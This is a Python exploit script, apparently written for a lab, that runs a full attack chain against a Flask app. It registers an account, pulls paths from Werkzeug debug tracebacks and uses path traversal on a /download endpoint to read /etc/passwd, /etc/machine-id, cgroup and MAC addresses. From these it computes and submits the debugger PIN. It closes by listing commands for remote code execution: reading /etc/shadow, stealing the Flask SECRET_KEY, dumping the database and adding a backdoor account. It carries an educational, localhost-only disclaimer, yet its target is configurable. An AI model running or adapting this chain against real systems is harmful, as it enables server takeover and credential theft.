#!/usr/bin/env python3
"""
LFI -> Werkzeug PIN -> RCE  --  Full Attack Chain
=================================================

This script demonstrates the COMPLETE attack chain:

  0.  Register a new account (no existing credentials needed)
  1.  Trigger an error page  ->  leak public bits (username, paths)
  2.  Exploit /download LFI  ->  read private files (MAC, machine-id)
  3.  Calculate the debug PIN from collected values
  4.  Authenticate to the debugger console
  5.  Execute arbitrary Python on the server  (RCE)

Run against YOUR OWN localhost Flask app only.

Usage:
    python3 scripts/lfi_to_rce.py
    python3 scripts/lfi_to_rce.py --target http://127.0.0.1:5000
"""

import argparse
import os
import re
import sys
import time

# werkzeug_pin_calc.py lives in the same scripts/ directory so we can import it
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from werkzeug_pin_calc import calculate_pin

try:
    import requests
except ImportError:
    print("requests kutuphanesi gerekli:  pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"

# the attacker can register their own account -- no existing password needed
ATTACKER_USER = "attacker_" + str(int(time.time()))[-6:]  # random username so multiple runs dont clash
ATTACKER_PASS = "lfi_exploit_2026"

# files to read via LFI -- each one is a component needed for PIN calculation
LFI_TARGETS = {
    "etc/passwd":                       "System user list (recon)",
    "etc/machine-id":                   "Machine ID (PIN component)",
    "proc/self/cgroup":                 "Cgroup info (PIN component)",
    "sys/class/net/eth0/address":       "MAC address -- eth0",
    "sys/class/net/ens33/address":      "MAC address -- ens33",
    "sys/class/net/enp0s3/address":     "MAC address -- enp0s3",
    "sys/class/net/wlan0/address":      "MAC address -- wlan0",
}

TRAVERSAL_DEPTHS = range(3, 12)


# ──────────────────────────────────────────────
# UTILITIES
# ──────────────────────────────────────────────

class Colors:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner(text):
    print(f"\n{Colors.BOLD}{'=' * 62}")
    print(f"  {text}")
    print(f"{'=' * 62}{Colors.RESET}")

def success(msg):
    print(f"  {Colors.GREEN}[+]{Colors.RESET} {msg}")

def fail(msg):
    print(f"  {Colors.RED}[-]{Colors.RESET} {msg}")

def info(msg):
    print(f"  {Colors.CYAN}[*]{Colors.RESET} {msg}")

def warn(msg):
    print(f"  {Colors.YELLOW}[!]{Colors.RESET} {msg}")


def is_login_page(text):
    """check if we got redirected to the login page instead of getting real content.
    if the response contains the login form, our session expired or we are not authenticated."""
    indicators = ["<title>Login</title>", "name=\"username\"", "name=\"password\"", "/login"]
    return sum(1 for i in indicators if i in text) >= 2


# ──────────────────────────────────────────────
# PHASE 0 -- Authenticate
# ──────────────────────────────────────────────

def phase0_authenticate(session, target, username, password):
    banner("PHASE 0 -- Attacker Creates an Account")
    info(f"Registering new account: '{username}'")

    try:
        # step 1: register a new account on the public registration page
        resp = session.post(
            f"{target}/register",
            data={"username": username, "password": password, "confirm": password},
            allow_redirects=True,
            timeout=5,
        )

        # if we didnt get redirected back to login, registration worked
        if is_login_page(resp.text):
            # registration didnt work -- maybe the user already exists, try logging in
            warn("Registration might have failed, trying login...")
            resp = session.post(
                f"{target}/login",
                data={"username": username, "password": password},
                allow_redirects=True,
                timeout=5,
            )
            if is_login_page(resp.text):
                fail("Both registration and login failed")
                return False
            success(f"Logged in as existing user '{username}'")
        else:
            success(f"Account created and logged in as '{username}'")

        # show the session cookie so the user can see what the server gave us
        cookies = session.cookies.get_dict()
        if cookies:
            for name, value in cookies.items():
                display = value[:50] + "..." if len(value) > 50 else value
                info(f"Session cookie: {name}={display}")
        
        print()
        info("The attacker did NOT need to know any existing passwords.")
        info("They just registered a new account on the public site.")
        info("Any authenticated user can reach /download and exploit LFI.")

        return True

    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}. Is Flask running?")
        return False


# ──────────────────────────────────────────────
# PHASE 1 -- Trigger error page, extract public bits
# ──────────────────────────────────────────────

def phase1_leak_public_bits(session, target):
    banner("PHASE 1 -- Information Leak via Error Page")
    info("Triggering an error to get Werkzeug stack trace...")

    error_urls = [
        f"{target}/debug_test",
        f"{target}/notes/99999999",
        f"{target}/download?file=",
    ]

    traceback_text = None
    for url in error_urls:
        try:
            resp = session.get(url, timeout=5)
            if "Traceback" in resp.text or "debugger" in resp.text.lower():
                traceback_text = resp.text
                success(f"Werkzeug debugger page from {url}")
                break
        except requests.exceptions.ConnectionError:
            fail(f"Cannot connect to {target}")
            return None

    if not traceback_text:
        warn("No Werkzeug debugger page found")
        warn("Trying to extract info from error messages...")
        for url in error_urls:
            try:
                resp = session.get(url, timeout=5)
                if not is_login_page(resp.text) and ("Error" in resp.text or "error" in resp.text):
                    traceback_text = resp.text
                    success(f"Error info from {url}")
                    break
            except:
                pass

    public_bits = {
        "username": None,
        "modname": "flask.app",
        "app_name": "Flask",
        "flask_path": None,
    }

    if traceback_text:
        # Username
        user_match = re.search(r'/home/([^/]+)/', traceback_text)
        if user_match:
            public_bits["username"] = user_match.group(1)
            success(f"Username leaked: {public_bits['username']}")
        elif '/root/' in traceback_text:
            public_bits["username"] = "root"
            success("Username leaked: root")

        # Flask path
        flask_match = re.search(r'(\/\S+\/flask\/app\.py)', traceback_text)
        if flask_match:
            public_bits["flask_path"] = flask_match.group(1)
            success(f"Flask path leaked: {public_bits['flask_path']}")

        # Python version
        py_match = re.search(r'python(\d+\.\d+)', traceback_text)
        if py_match:
            info(f"Python version detected: {py_match.group(1)}")

        # App file path
        app_match = re.search(r'File "(\S+app\.py)"', traceback_text)
        if app_match:
            info(f"App source path: {app_match.group(1)}")
    else:
        warn("Could not leak any info from error pages")

    return public_bits


# ──────────────────────────────────────────────
# PHASE 2 -- Read private files via LFI
# ──────────────────────────────────────────────

def try_lfi(session, target, file_path):
    """Try reading a file via path traversal at various depths."""
    for depth in TRAVERSAL_DEPTHS:
        traversal = "../" * depth + file_path
        url = f"{target}/download?file={traversal}"
        try:
            resp = session.get(url, timeout=5)

            # critical check: did we get the actual file content or the login page?
            if is_login_page(resp.text):
                continue

            if resp.status_code == 200:
                text = resp.text.strip()
                # non-empty response that is not an error message means we found the file
                if text and "not found" not in text.lower() and "error reading" not in text.lower():
                    return text, depth
        except:
            pass
    return None, None


def phase2_read_private_files(session, target):
    banner("PHASE 2 -- Read Private Files via Path Traversal (LFI)")
    info(f"Target endpoint: {target}/download?file=...")
    info("Trying different ../  depths for each target file")
    print()

    results = {}

    for file_path, description in LFI_TARGETS.items():
        content, depth = try_lfi(session, target, file_path)
        if content:
            display = content[:80] + "..." if len(content) > 80 else content
            display = display.replace("\n", "\\n")
            success(f"{file_path}")
            print(f"       {'../' * depth}{file_path}")
            print(f"       Content: {Colors.YELLOW}{display}{Colors.RESET}")
            results[file_path] = content
        else:
            fail(f"{file_path} -- {description}")

    return results


# ──────────────────────────────────────────────
# PHASE 3 -- Calculate PIN
# ──────────────────────────────────────────────

def phase3_calculate_pin(public_bits, lfi_results):
    banner("PHASE 3 -- Calculate Werkzeug Debug PIN")

    # --- MAC address ---
    mac_int = None
    for iface in ["eth0", "ens33", "enp0s3", "wlan0"]:
        key = f"sys/class/net/{iface}/address"
        if key in lfi_results:
            mac_str = lfi_results[key].strip()
            try:
                mac_int = int(mac_str.replace(":", ""), 16)
                success(f"MAC address: {iface}: {mac_str} -> {mac_int}")
                break
            except ValueError:
                pass

    if mac_int is None:
        fail("Could not find MAC address via LFI")
        warn("On real machines, at least one interface should be readable")
        return None, None

    # --- Machine ID ---
    machine_id = b""

    if "etc/machine-id" in lfi_results:
        mid_val = lfi_results["etc/machine-id"].strip()
        machine_id += mid_val.encode()
        success(f"Machine ID: {mid_val}")
    else:
        fail("Could not read /etc/machine-id")
        return None, None

    # --- Cgroup ---
    if "proc/self/cgroup" in lfi_results:
        cgroup_raw = lfi_results["proc/self/cgroup"].strip()
        first_line = cgroup_raw.split("\n")[0]
        cgroup_val = first_line.rpartition("/")[2]
        machine_id += cgroup_val.encode()
        info(f"Cgroup: {first_line} -> extracted: '{cgroup_val}'")
    else:
        warn("Could not read /proc/self/cgroup (non-critical)")

    # --- Assemble bits ---
    username = public_bits.get("username")
    modname = public_bits.get("modname", "flask.app")
    app_name = public_bits.get("app_name", "Flask")
    flask_path = public_bits.get("flask_path")

    if not username or not flask_path:
        fail("Missing public bits -- error page did not leak enough info")
        if not username:
            warn("Username not found. Check error page file paths")
        if not flask_path:
            warn("Flask path not found. Common paths:")
            warn("  /home/<user>/venv/lib/python3.x/site-packages/flask/app.py")
            warn("  /usr/lib/python3/dist-packages/flask/app.py")
        return None, None

    print()
    info("Assembling hash inputs:")
    print(f"       public[0]  username   = {username}")
    print(f"       public[1]  modname    = {modname}")
    print(f"       public[2]  app_name   = {app_name}")
    print(f"       public[3]  flask_path = {flask_path}")
    print(f"       private[0] MAC (int)  = {mac_int}")
    print(f"       private[1] machine_id = {machine_id}")

    # SHA-1 calculation -- imported from werkzeug_pin_calc.py in the same directory
    probably_public = [username, modname, app_name, flask_path]
    private = [str(mac_int), machine_id]

    pin, cookie_name = calculate_pin(probably_public, private)

    print()
    print(f"  {Colors.BOLD}{'─' * 42}")
    print(f"  CALCULATED PIN  :  {Colors.GREEN}{pin}{Colors.RESET}")
    print(f"  {Colors.BOLD}COOKIE NAME       :  {Colors.CYAN}{cookie_name}{Colors.RESET}")
    print(f"  {Colors.BOLD}{'─' * 42}{Colors.RESET}")

    return pin, cookie_name


# ──────────────────────────────────────────────
# PHASE 4 -- Authenticate to debugger
# ──────────────────────────────────────────────

def phase4_test_pin(session, target, pin, cookie_name):
    banner("PHASE 4 -- Authenticate to Werkzeug Debugger")

    if not pin:
        fail("No PIN calculated -- cannot proceed")
        return False

    info(f"Attempting PIN: {pin}")

    try:
        resp = session.get(f"{target}/debug_test", timeout=5)

        secret_match = re.search(r'SECRET\s*=\s*["\']([^"\']+)', resp.text)
        if not secret_match:
            warn("Could not auto-extract debugger SECRET")
            info("Try the PIN manually in your browser:")
            print(f"\n       1. Open {Colors.CYAN}{target}/debug_test{Colors.RESET}")
            print(f"       2. Click the console icon on any traceback line")
            print(f"       3. Enter PIN: {Colors.GREEN}{pin}{Colors.RESET}")
            print(f"       4. Run Python commands on the server")
            return True

        secret = secret_match.group(1)
        success(f"Debugger SECRET extracted: {secret[:20]}...")

        auth_resp = session.get(
            f"{target}/__debugger__",
            params={"cmd": "pinauth", "pin": pin, "s": secret},
            timeout=5,
        )

        if "true" in auth_resp.text.lower():
            success("PIN accepted -- debugger console unlocked!")
            return True
        else:
            fail("PIN rejected by debugger")
            warn("Algorithm might differ -- try manually in browser")
            return False

    except Exception as e:
        warn(f"Connection error: {e}")
        warn(f"Try PIN manually: {pin}")
        return True


# ──────────────────────────────────────────────
# PHASE 5 -- Execute commands (demo)
# ──────────────────────────────────────────────

def phase5_demonstrate_rce(target, pin):
    banner("PHASE 5 -- Remote Code Execution (what an attacker would do)")

    print(f"""
  {Colors.YELLOW}With debugger console access, an attacker can:{Colors.RESET}

  {Colors.RED}>>> import os{Colors.RESET}
  {Colors.RED}>>> os.popen('whoami').read(){Colors.RESET}
  Read the server username -- confirm access level

  {Colors.RED}>>> os.popen('cat /etc/shadow').read(){Colors.RESET}
  Read password hashes (if running as root)

  {Colors.RED}>>> import flask; flask.current_app.config['SECRET_KEY']{Colors.RESET}
  Steal the secret key -- forge any session cookie

  {Colors.RED}>>> from models import Note; [n.title for n in Note.query.all()]{Colors.RESET}
  Read the entire database

  {Colors.RED}>>> import app; app.USERS['backdoor'] = 'backdoor123'{Colors.RESET}
  Create a backdoor account in memory

  {Colors.BOLD}{'─' * 58}{Colors.RESET}

  To try this yourself:

    1.  Open {Colors.CYAN}{target}/debug_test{Colors.RESET} in your browser
    2.  Click the small console icon on any traceback line
    3.  Enter PIN: {Colors.GREEN}{pin}{Colors.RESET}
    4.  Type Python commands in the interactive console

  {Colors.BOLD}{'─' * 58}{Colors.RESET}
""")


# ──────────────────────────────────────────────
# FULL CHAIN SUMMARY
# ──────────────────────────────────────────────

def print_chain_summary(public_bits, lfi_results, pin):
    banner("ATTACK CHAIN SUMMARY")

    print(f"""
  {Colors.BOLD}The complete attack chained THREE weaknesses:{Colors.RESET}

  ┌──────────────────────────────────────────────────────────┐
  │  WEAKNESS 1:  Open registration, no privilege separation │
  │  Attacker registers a free account -- no credentials      │
  │  needed, no admin access, no social engineering.         │
  │  Just a username and password on /register.              │
  └──────────────────────────┬───────────────────────────────┘
                             │
  ┌──────────────────────────▼───────────────────────────────┐
  │  VULNERABILITY 2:  debug=True                            │
  │  Werkzeug debugger active -- error pages leak:            │
  │    • Full file paths  ->  username, Flask location        │
  │    • Interactive console (protected by PIN)               │
  └──────────────────────────┬───────────────────────────────┘
                             │
  ┌──────────────────────────▼───────────────────────────────┐
  │  VULNERABILITY 3:  Path Traversal (LFI)                  │
  │  The /download endpoint reads arbitrary server files:    │""")

    for key in lfi_results:
        label = key.split("/")[-1]
        print(f"  │    • /{key:<42s}│")

    print(f"""  └──────────────────────────┬───────────────────────────────┘
                             │
  ┌──────────────────────────▼───────────────────────────────┐
  │  RESULT:  PIN = {pin or 'FAILED':>9s}                             │
  │  -> {Colors.RED}FULL REMOTE CODE EXECUTION{Colors.RESET}                          │
  └──────────────────────────────────────────────────────────┘

  {Colors.YELLOW}KEY INSIGHT:{Colors.RESET}  Anyone who can register -> full server control.

    The attacker did not need to steal credentials or find
    a backdoor.  They registered a free account like any user
    and escalated to Remote Code Execution through LFI + debug.
    
    This is why {Colors.BOLD}defense in depth{Colors.RESET} matters:
    • debug=True alone?  PIN blocks console.
    • LFI alone?  Can read files but not execute code.
    • Both together?  {Colors.RED}Game over.{Colors.RESET}
""")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="LFI -> Werkzeug PIN -> RCE: Full attack chain demo"
    )
    parser.add_argument("--target", default=DEFAULT_TARGET,
                        help=f"Target URL (default: {DEFAULT_TARGET})")
    args = parser.parse_args()
    target = args.target.rstrip("/")

    print(f"""
{Colors.BOLD}{Colors.RED}
  ██╗     ███████╗██╗    ██████╗  ██████╗███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔════╝██╔════╝
  ██║     █████╗  ██║    ██████╔╝██║     █████╗  
  ██║     ██╔══╝  ██║    ██╔══██╗██║     ██╔══╝  
  ███████╗██║     ██║    ██║  ██║╚██████╗███████╗
  ╚══════╝╚═╝     ╚═╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝
{Colors.RESET}
  {Colors.DIM}Local File Inclusion -> Remote Code Execution{Colors.RESET}
  {Colors.DIM}Target: {target}{Colors.RESET}
  {Colors.DIM}Educational use on YOUR OWN systems only.{Colors.RESET}
""")

    # persistent session -- cookies are carried across all requests automatically
    session = requests.Session()

    time.sleep(0.5)

    # Phase 0: Register & Login
    if not phase0_authenticate(session, target, ATTACKER_USER, ATTACKER_PASS):
        sys.exit(1)

    time.sleep(0.5)

    # Phase 1: Information leak
    public_bits = phase1_leak_public_bits(session, target)
    if not public_bits:
        fail("Could not connect to target")
        sys.exit(1)

    time.sleep(0.5)

    # Phase 2: LFI
    lfi_results = phase2_read_private_files(session, target)
    if not lfi_results:
        fail("LFI failed -- no files could be read")
        fail("Is the /download endpoint added to app.py?")
        sys.exit(1)

    time.sleep(0.5)

    # Phase 3: PIN calculation
    pin, cookie = phase3_calculate_pin(public_bits, lfi_results)

    time.sleep(0.5)

    # Phase 4: Test PIN
    if pin:
        phase4_test_pin(session, target, pin, cookie)

    time.sleep(0.5)

    # Phase 5: RCE demonstration
    if pin:
        phase5_demonstrate_rce(target, pin)

    # Summary
    print_chain_summary(public_bits, lfi_results, pin)


if __name__ == "__main__":
    main()
